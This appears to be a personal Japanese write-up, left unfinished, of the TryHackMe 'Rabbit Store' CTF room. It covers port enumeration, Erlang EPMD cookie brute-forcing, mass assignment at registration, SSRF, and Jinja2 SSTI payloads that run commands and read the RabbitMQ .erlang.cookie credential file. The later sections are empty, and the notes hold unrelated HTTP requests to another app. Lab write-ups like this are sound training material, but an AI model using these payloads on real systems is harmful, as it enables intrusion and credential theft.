![](https://i.imgur.com/CRZj253.png)

- URL : https://tryhackme.com/room/rabbitstore
-  #medium 
- OS : #Linux 
- Machine Author(s): 
- Hack Date: 2025-06-25,10:55

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ



|**ポート**|**サービス**|**バージョン**|**その他**|
|---|---|---|---|
|22/tcp|ssh|OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)|ホストキーあり（ECDSA、ED25519）|
|80/tcp|http|Apache httpd 2.4.52|http-title: リダイレクトありhttp-server-header: Apache/2.4.52 (Ubuntu)|
|4369/tcp|epmd|Erlang Port Mapper Daemon|epmd-info: ノード rabbit:25672|
|25672/tcp|unknown|-|rabbitMQ 関連ポートの可能性あり（epmd での関連ノード情報より）|

## nmap
```bash

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBXuyWp8m+y9taS8DGHe95YNOsKZ1/LCOjNlkzNjrnqGS1sZuQV7XQT9WbK/yWAgxZNtBHdnUT6uSEZPbfEUjUw=
|   256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILcGp6ztslpYtKYBl8IrBPBbvf3doadnd5CBsO+HFg5M
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cloudsite.thm/
|_http-server-header: Apache/2.4.52 (Ubuntu)
4369/tcp  open  epmd    syn-ack ttl 63 Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown syn-ack ttl 63
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/24%OT=22%CT=%CU=33294%PV=Y%DS=2%DC=T%G=N%TM=685B59D4
OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=
OS:A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M5
OS:08ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B
OS:3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%
OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%
OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=
OS:40%CD=S)

Uptime guess: 29.742 days (since Mon May 26 01:18:33 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   297.83 ms 10.9.0.1
2   303.22 ms 10.10.159.93

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:07
Completed NSE at 19:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:07
Completed NSE at 19:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:07
Completed NSE at 19:07, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.96 seconds
           Raw packets sent: 36 (2.394KB) | Rcvd: 22 (1.638KB)

```

ドメインは、`cloudsite.thm`
- /etc/hostsに書く

Erlang Port Mapper Daemonってなんだ？？
- Erlang というプログラミング言語（およびそのランタイム）における、ノード間通信を管理するためのプロセス
- 分散システム」を簡単に作れることが特徴で、複数のノード（＝Erlangアプリケーション）をネットワーク越しにやり取りさせるための仕組みがあり
- epmd は通常、ローカルネットワーク内で使われる
	- インターネットに直接晒すのは 推奨されない
	- Erlang ノードは、cookie を使った認証もありますが、デフォルトのままだと脆弱になる可能性もあるため注意が必要

## Webサイト
- http://cloudsite.thm/
	- Create Accountをクリックすると、`storage.cloudsite.thm`に飛ぶので、これも/etc/hostsに追加
![](https://i.imgur.com/jc6KKpZ.png)



ログインした時に送られるcokkie
```sh
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGhlbGxvLmh0YiIsInN1YnNjcmlwdGlvbiI6ImluYWN0aXZlIiwiaWF0IjoxNzUwODIzOTMzLCJleHAiOjE3NTA4Mjc1MzN9.y0O2JPEkOHCAMkSZV2_l_OsyZ4eGlSCIaY3x8K04ak0
```

smarteyeappsでwebサイト作ってるっぽい
```sh
      <div class="container">
        <a href="https://www.smarteyeapps.com/"
          >2015 &copy; All Rights Reserved | Designed and Developed by
          Smarteyeapps</a
```


アカウント作成して、ログインするとこんな感じの内部だけですわみたいな表示出てくる
![](https://i.imgur.com/385Ww3G.png)

## whatweb
```bash
└─$ whatweb http://cloudsite.thm     
http://cloudsite.thm [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[info@smarteyeapps.com,sales@smarteyeapps.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.92.52], JQuery[3.2.1], Script


└─$ whatweb http://storage.cloudsite.thm
http://storage.cloudsite.thm [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[info@smarteyeapps.com,sales@smarteyeapps.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.92.52], JQuery[3.2.1], Script
                                                                         
```

## Erlang Port Mapper Daemon

ノード一覧取得用バイナリ
```sh
└─$ printf '\x00\x01\x6e' | nc 10.10.245.18 4369

name rabbit at port 25672
```

rabbit : ノード名
10.10.245.18（あなたが指定したターゲット） : ノードのホスト
25672（これはRabbitMQのデフォルト）:Erlangノードの通信ポート

|                 |                             |
| --------------- | --------------------------- |
| ノード名            | rabbit                      |
| ノードのホスト         | 10.10.245.18（あなたが指定したターゲット） |
| Erlangノードの通信ポート | 25672（これはRabbitMQのデフォルト）    |

接続
```sh
└─$ erl -name attacker@attacker.local -setcookie rabbitmq
Erlang/OTP 27 [erts-15.2.7] [source] [64-bit] [smp:6:6] [ds:6:6:10] [async-threads:1] [jit]

Eshell V15.2.7 (press Ctrl+G to abort, type help(). for help)
(attacker@attacker.local)1> net_adm:ping('rabbit@forge.local').
pang
```

EPMDでのクッキーを取得した後のRCE例
- https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/

これ参考になる
- https://github.com/gteissier/erl-matter
### 25672ポートの調査
以下のツールで、調査した
- https://github.com/gteissier/erl-matter/blob/master/erldp-info.nse
```sh
PORT      STATE SERVICE VERSION
25672/tcp open  erldp   Erlang distribution protocol
| erldp-info: 
|   version: 5
|   node: rabbit@forge
|_  flags: 3df7fbd
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops

```
結果
- version: 5 
	- 使用されているErlangの分散通信プロトコルのバージョン
- node
	- rabbit@forge : FQDNの判明

### クッキーのブルートフォース
使用したツール
- https://github.com/gteissier/erl-matter/blob/master/bruteforce-erldp.py
```sh

python3 bruteforce-erldp.py --interval 381410768,386584488,10000 10.10.245.18 25672

```

# Foothold
## Webサイト
ユーザー登録して、ログインした時に返ってくるCookie jwtの値
![](https://i.imgur.com/2j0jUwk.png)

Base64でデコードすると、平文でsubscription inactiveとある
- このことから、実はユーザー登録時にsubscriptionというパラメーターがあるのではとなる
![](https://i.imgur.com/bWRxIlt.png)

以下のようにユーザー登録時にsubscription: 'active'というパラメーターを付け加えて、
![](https://i.imgur.com/JMe0N5Q.png)

ログインすると、今までは見えていなかったサイトが見える
![](https://i.imgur.com/5qBJbki.png)

SSRFの脆弱性があるかを試していると、3000番が空いていて、以下のファイルがあることがわかった
![](https://i.imgur.com/KB46JQa.png)

![](https://i.imgur.com/6daxjwe.png)


File Pathがレスポンスされるので、そこに対してGETする

GETのレスポンス内容
```sh
HTTP/1.1 200 OK
Date: Wed, 25 Jun 2025 12:36:12 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Wed, 25 Jun 2025 12:36:02 GMT
ETag: W/"233-197a7168bf8"
Content-Type: application/octet-stream
Content-Length: 563
Connection: close

Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.

```

- `/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.`が気になる

アクセスしてみる
![](https://i.imgur.com/MZ9JcBc.png)


usernameはadminとしてPOSTする
![](https://i.imgur.com/1jsjMuC.png)
adminと入力したらレスポンスにadminが帰ってくるので、SSTIの脆弱性の可能性がある
なので、[[Server-Side Attacks#SSTI]]に従って、分岐から、どのSSTIテンプレートを使っているのか確かめるためにペイロードをusernameとして投げる

`{{7*7}}`
![](https://i.imgur.com/EreeEMM.png)

`{{7*'7'}}`
![](https://i.imgur.com/ydmFmMk.png)

SSTIはJinja2だとわかる
RCEのペイロードをインジェクションする
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
![](https://i.imgur.com/58TzaND.png)

RCEできて、idコマンドの結果を取得できた

user.txtは以下で取得できた
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat ../user.txt').read() }}`


EPMDで、クッキーを取得すれば、RCEができることもわかっているので、クッキーを取得する
`{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /var/lib/rabbitmq/.erlang.cookie').read() }}"}`
![](https://i.imgur.com/IhhanLJ.png)

Cookie取得できた
- rLmdPNTTZX7TLKpY

でも、[shell-erldp.py](https://github.com/gteissier/erl-matter/blob/master/shell-erldp.py)を使ってもエラーが発生してしまう
- 修正する
```sh
└─$ ./shell-erldp.py 10.10.245.18 25672 rLmdPNTTZX7TLKpY  id
[*] authenticated onto victim
Traceback (most recent call last):
  File "./shell-erldp.py", line 172, in <module>
    reply = recv_reply(sock)
  File "./shell-erldp.py", line 147, in recv_reply
    terms = [t for t in erl_dist_recv(f)]
  File "./shell-erldp.py", line 94, in erl_dist_recv
    (parsed, term) = erl.binary_to_term(data)
  File "/home/kali/Desktop/THM/machine/RabbitStore/erl-matter/erlang.py", line 421, in binary_to_term
    i, term = _binary_to_term(1, data)
  File "/home/kali/Desktop/THM/machine/RabbitStore/erl-matter/erlang.py", line 505, in _binary_to_term
    i, tuple_value = _binary_to_term_sequence(i, length, data)
  File "/home/kali/Desktop/THM/machine/RabbitStore/erl-matter/erlang.py", line 630, in _binary_to_term_sequence
    i, element = _binary_to_term(i, data)
  File "/home/kali/Desktop/THM/machine/RabbitStore/erl-matter/erlang.py", line 625, in _binary_to_term
    raise ParseException('invalid tag')
erlang.ParseException: invalid tag

```

接続する




```bash

```

```bash

```

```bash

```

```bash

```

```bash

```





# Lateral Movement
<横方向の動きに関する説明をここに書いてください>
```bash

```

```bash

```

```bash

```

```bash

```

```bash

```






# Privilege Escalation

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```







## Notes



<このWriteupで特に重要な点や学んだことを追加で記載するセクション>



作成ボタン押すと
```sh
OPTIONS /events HTTP/2
Host: kininaru-clip.onrender.com
Accept: */*
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
Origin: https://kininaru-clip-front.onrender.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Sec-Fetch-Dest: empty
Referer: https://kininaru-clip-front.onrender.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9


```


```sh
POST /events HTTP/2
Host: kininaru-clip.onrender.com
Content-Length: 40
Sec-Ch-Ua: 
Accept: application/json, text/plain, */*
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Sec-Ch-Ua-Platform: ""
Origin: https://kininaru-clip-front.onrender.com
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://kininaru-clip-front.onrender.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

{"title":"aaa","users":[{"name":"aaa"}]}
```


```sh
GET /done?id=01JYJRFF7A7P010RXEP9PSVYXB&_rsc=1shaa HTTP/2
Host: kininaru-clip-front.onrender.com
Sec-Ch-Ua: 
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22new%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Fnew%22%2C%22refresh%22%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Next-Url: /new
Rsc: 1
Sec-Ch-Ua-Platform: ""
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://kininaru-clip-front.onrender.com/new
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9


```


# 参考
https://jaxafed.github.io/posts/tryhackme-rabbit_store/
# 詰まったところ
EPMDクッキーのブルートフォースも成功しないし、ユーザー登録できても、内部のユーザーではないと言われるし詰まった

反省点
- jwtだからと放置したところ
	- 完全なランダムな値ではなくて、エンコードしたら意味を持っている文字列であることもある



